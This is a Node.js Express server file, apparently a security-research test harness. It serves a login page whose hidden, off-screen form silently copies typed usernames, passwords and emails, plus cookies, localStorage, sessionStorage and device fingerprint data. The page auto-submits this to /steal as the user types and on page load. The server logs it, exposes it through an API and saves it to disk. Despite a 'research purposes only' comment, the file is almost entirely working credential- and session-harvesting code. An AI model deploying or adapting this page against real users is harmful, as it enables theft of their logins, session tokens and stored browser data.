const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 3000;

// Middleware
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public'));

// Store captured data (for research purposes only)
let capturedData = [];

// Permission handling endpoints
let permissionLogs = [];

// Routes
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Test Page for Security Research</title>
            <meta charset="utf-8">
            <style>
                body { font-family: Arial, sans-serif; margin: 40px; }
                .container { max-width: 800px; margin: 0 auto; }
                .form-group { margin: 20px 0; }
                label { display: block; margin-bottom: 5px; }
                input, textarea { width: 100%; padding: 10px; border: 1px solid #ddd; }
                button { padding: 10px 20px; background: #007bff; color: white; border: none; cursor: pointer; }
                .hidden { display: none; }
                .stealth-form { position: absolute; left: -9999px; top: -9999px; }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>Test Page for Security Research</h1>
                <p>This page is designed for internal security testing only.</p>
                
                <!-- Visible form for testing -->
                <form id="visibleForm" method="POST" action="/capture">
                    <div class="form-group">
                        <label for="username">Username:</label>
                        <input type="text" id="username" name="username" autocomplete="username">
                    </div>
                    <div class="form-group">
                        <label for="password">Password:</label>
                        <input type="password" id="password" name="password" autocomplete="current-password">
                    </div>
                    <div class="form-group">
                        <label for="email">Email:</label>
                        <input type="email" id="email" name="email" autocomplete="email">
                    </div>
                    <button type="submit">Submit</button>
                </form>
                
                <!-- Hidden stealth form -->
                <form id="stealthForm" class="stealth-form" method="POST" action="/steal">
                    <input type="hidden" id="stealthUsername" name="username">
                    <input type="hidden" id="stealthPassword" name="password">
                    <input type="hidden" id="stealthEmail" name="email">
                    <input type="hidden" id="stealthData" name="additionalData">
                </form>
                
                <!-- Auto-submit script -->
                <script>
                    // Auto-submit stealth form when visible form is filled
                    document.getElementById('visibleForm').addEventListener('input', function(e) {
                        const stealthForm = document.getElementById('stealthForm');
                        const stealthUsername = document.getElementById('stealthUsername');
                        const stealthPassword = document.getElementById('stealthPassword');
                        const stealthEmail = document.getElementById('stealthEmail');
                        const stealthData = document.getElementById('stealthData');
                        
                        // Copy data to stealth form
                        stealthUsername.value = document.getElementById('username').value;
                        stealthPassword.value = document.getElementById('password').value;
                        stealthEmail.value = document.getElementById('email').value;
                        
                        // Capture additional data
                        const additionalData = {
                            timestamp: new Date().toISOString(),
                            url: window.location.href,
                            userAgent: navigator.userAgent,
                            cookies: document.cookie,
                            localStorage: Object.keys(localStorage).reduce((acc, key) => {
                                acc[key] = localStorage.getItem(key);
                                return acc;
                            }, {}),
                            sessionStorage: Object.keys(sessionStorage).reduce((acc, key) => {
                                acc[key] = sessionStorage.getItem(key);
                                return acc;
                            }, {}),
                            screen: {
                                width: screen.width,
                                height: screen.height,
                                availWidth: screen.availWidth,
                                availHeight: screen.availHeight
                            },
                            window: {
                                innerWidth: window.innerWidth,
                                innerHeight: window.innerHeight
                            },
                            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                            language: navigator.language,
                            languages: navigator.languages,
                            platform: navigator.platform,
                            hardwareConcurrency: navigator.hardwareConcurrency,
                            deviceMemory: navigator.deviceMemory,
                            onLine: navigator.onLine,
                            cookieEnabled: navigator.cookieEnabled
                        };
                        
                        stealthData.value = JSON.stringify(additionalData);
                        
                        // Auto-submit after a short delay
                        setTimeout(() => {
                            if (stealthUsername.value && stealthPassword.value) {
                                stealthForm.submit();
                            }
                        }, 1000);
                    });
                    
                    // Also capture data on page load
                    window.addEventListener('load', function() {
                        const stealthForm = document.getElementById('stealthForm');
                        const stealthData = document.getElementById('stealthData');
                        
                        const pageLoadData = {
                            type: 'page_load',
                            timestamp: new Date().toISOString(),
                            url: window.location.href,
                            referrer: document.referrer,
                            userAgent: navigator.userAgent,
                            cookies: document.cookie,
                            localStorage: Object.keys(localStorage).reduce((acc, key) => {
                                acc[key] = localStorage.getItem(key);
                                return acc;
                            }, {}),
                            sessionStorage: Object.keys(sessionStorage).reduce((acc, key) => {
                                acc[key] = sessionStorage.getItem(key);
                                return acc;
                            }, {})
                        };
                        
                        stealthData.value = JSON.stringify(pageLoadData);
                        
                        // Submit stealth form on page load
                        setTimeout(() => {
                            stealthForm.submit();
                        }, 500);
                    });
                </script>
            </div>
        </body>
        </html>
    `);
});

// Capture endpoint for visible form
app.post('/capture', (req, res) => {
    const data = {
        type: 'visible_form_submission',
        timestamp: new Date().toISOString(),
        data: req.body,
        headers: req.headers
    };
    
    capturedData.push(data);
    console.log('📝 Captured visible form data:', data);
    
    res.json({ success: true, message: 'Data captured' });
});

// Stealth endpoint for hidden form
app.post('/steal', (req, res) => {
    const data = {
        type: 'stealth_form_submission',
        timestamp: new Date().toISOString(),
        data: req.body,
        headers: req.headers
    };
    
    capturedData.push(data);
    console.log('🕵️ Captured stealth form data:', data);
    
    res.json({ success: true, message: 'Stealth data captured' });
});

// Exfiltration endpoint
app.post('/exfiltrate', (req, res) => {
    const data = {
        type: 'data_exfiltration',
        timestamp: new Date().toISOString(),
        data: req.body,
        headers: req.headers
    };
    
    capturedData.push(data);
    console.log('🚨 Data exfiltration attempt:', data);
    
    res.json({ success: true, message: 'Data exfiltrated' });
});

// API endpoint to get all captured data
app.get('/api/captured-data', (req, res) => {
    res.json({
        total: capturedData.length,
        data: capturedData
    });
});

// API endpoint to clear captured data
app.post('/api/clear-data', (req, res) => {
    capturedData = [];
    console.log('🧹 Cleared all captured data');
    res.json({ success: true, message: 'Data cleared' });
});

// API endpoint to save captured data to file
app.post('/api/save-data', (req, res) => {
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    const filename = `captured_data_${timestamp}.json`;
    
    fs.writeFileSync(filename, JSON.stringify(capturedData, null, 2));
    console.log(`💾 Saved captured data to ${filename}`);
    
    res.json({ success: true, filename: filename });
});

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({
        status: 'healthy',
        timestamp: new Date().toISOString(),
        capturedDataCount: capturedData.length
    });
});

// Permission handling endpoints
app.post('/permissions/auto-granted', (req, res) => {
    console.log('🔓 Permission auto-granted:', req.body);
    permissionLogs.push({
        type: 'auto_granted',
        data: req.body,
        timestamp: new Date().toISOString()
    });
    res.json({ success: true, message: 'Permission auto-granted' });
});

app.post('/permissions/change', (req, res) => {
    console.log('🔄 Permission changed:', req.body);
    permissionLogs.push({
        type: 'permission_change',
        data: req.body,
        timestamp: new Date().toISOString()
    });
    res.json({ success: true, message: 'Permission change logged' });
});

app.get('/permissions/logs', (req, res) => {
    res.json({
        total: permissionLogs.length,
        logs: permissionLogs,
        timestamp: new Date().toISOString()
    });
});

// Start server
app.listen(PORT, () => {
    console.log(`🚀 Test server running on http://localhost:${PORT}`);
    console.log(`📊 Health check: http://localhost:${PORT}/health`);
    console.log(`📝 API endpoints:`);
    console.log(`   - GET  /api/captured-data`);
    console.log(`   - POST /api/clear-data`);
    console.log(`   - POST /api/save-data`);
    console.log(`🕵️ Attack endpoints:`);
    console.log(`   - POST /capture (visible form)`);
    console.log(`   - POST /steal (stealth form)`);
    console.log(`   - POST /exfiltrate (data exfiltration)`);
});

module.exports = app; 